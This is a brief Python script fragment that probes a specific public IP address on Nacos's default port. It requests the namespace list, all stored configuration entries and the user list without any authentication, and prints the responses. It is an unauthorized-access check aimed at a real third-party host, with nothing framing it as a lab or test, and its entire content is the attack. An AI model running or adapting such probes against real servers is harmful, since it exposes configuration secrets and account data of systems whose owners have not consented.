print('=== NACOS UA')
for path in ['/nacos/v1/console/namespaces','/nacos/v1/cs/configs?dataId=&group=&search=accurate&pageNo=1&pageSize=100','/nacos/v1/auth/users?pageNo=1&pageSize=50']:
    print('N',path,'=>',req('124.221.181.179',8848,'124.221.181.179','http',path,t=8)[:400])

